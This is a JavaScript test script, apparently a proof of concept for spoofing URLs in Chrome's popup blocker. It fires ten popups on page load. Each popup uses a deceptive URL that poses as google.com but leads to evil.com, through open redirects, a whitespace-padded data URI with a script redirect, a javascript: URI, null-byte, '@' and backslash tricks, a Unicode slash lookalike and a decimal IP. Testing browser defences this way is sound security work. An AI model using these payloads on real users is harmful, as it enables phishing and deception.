// Popup URL Spoof — Creative Bypass Tests
// Auto-fires on page load (NO user gesture) → Chrome MUST block them

(function() {
  var d = document.getElementById('display');
  if (!d) return;

  var tests = [
    {
      label: '1. Google Open Redirect',
      url: 'https://www.google.com/url?q=https://evil.com/search%3Fq%3Dtest'
    },
    {
      label: '2. YouTube Redirect',
      url: 'https://www.youtube.com/redirect?q=https://evil.com/search%3Fq%3Dtest'
    },
    {
      label: '3. Data URI (google.com text)',
      url: 'data:text/html,https://www.google.com/' + '%20'.repeat(60) +
           '<script>location="https://evil.com"<' + '/script>'
    },
    {
      label: '4. Javascript URI',
      url: 'javascript:void(location="https://evil.com/search?q=test")'
    },
    {
      label: '5. Null Byte %00',
      url: 'https://www.google.com%00.search@evil.com/search?q=what+is+claude'
    },
    {
      label: '6. About:Blank + Meta',
      url: 'about:blank'
    },
    {
      label: '7. Bing Redirect',
      url: 'https://www.bing.com/ck/a?redirect=https://evil.com/search%3Fq%3Dtest'
    },
    {
      label: '8. Backslash \\\\',
      url: 'https://www.google.com\\\\@evil.com/search?q=what+is+claude'
    },
    {
      label: '9. Unicode \\u2215',
      url: 'https://www.google.com%E2%88%95evil.com/search?q=test'
    },
    {
      label: '10. IP Decimal',
      url: 'https://www.google.com@2130706433/search?q=what+is+claude'
    }
  ];

  // Fire ALL popups after 8 seconds (user gesture definitely expired)
  // Chrome allows first ~3-5 popups, blocks the rest → shows blocked URLs in dialog
  function fireAll() {
    for (var i = 0; i < tests.length; i++) {
      try {
        var w = window.open(tests[i].url, '_blank');
        if (!w) {
          tests[i].status = 'BLOCKED';
        } else {
          tests[i].status = 'OPENED';
          w.close();
        }
      } catch(e) {
        tests[i].status = 'ERROR: ' + e.message;
      }
    }
    showResults();
  }

  function showResults() {
    var html = '';
    var blocked = 0;
    for (var i = 0; i < tests.length; i++) {
      var t = tests[i];
      var blockedClass = t.status === 'BLOCKED' ? 'style="background:#fef7e0"' : '';
      html += '<div ' + blockedClass + ' style="padding:8px;margin:4px 0;border:1px solid #ddd;border-radius:4px;font-size:11px">' +
        '<b>' + t.label + '</b> <span style="color:' + (t.status === 'BLOCKED' ? '#ea4335' : '#34a853') + '">' + t.status + '</span><br>' +
        '<span style="font-family:monospace;word-break:break-all;color:#666">' + t.url.substring(0, 70) + '...</span>' +
        '</div>';
      if (t.status === 'BLOCKED') blocked++;
    }

    html = '<div style="margin-bottom:8px;font-weight:600">' +
      blocked + ' of ' + tests.length + ' popups BLOCKED. ' +
      'Click the popup blocker icon (🔴✕) in address bar to see URLs.</div>' + html;

    d.innerHTML = html;
  }

  // Start countdown
  var sec = 8;
  d.innerHTML = '<div style="text-align:center;font-size:24px;color:#4285f4;padding:20px">' +
    'Popups fire in <b id="cd">' + sec + '</b> seconds...<br>' +
    '<span style="font-size:12px;color:#888">(waiting for user gesture to expire)</span></div>';

  var timer = setInterval(function() {
    sec--;
    var el = document.getElementById('cd');
    if (el) el.textContent = sec;
    if (sec <= 0) {
      clearInterval(timer);
      d.innerHTML = '<div style="text-align:center;padding:20px;color:#888">Firing 10 popups...</div>';
      setTimeout(fireAll, 100);
    }
  }, 1000);
})();
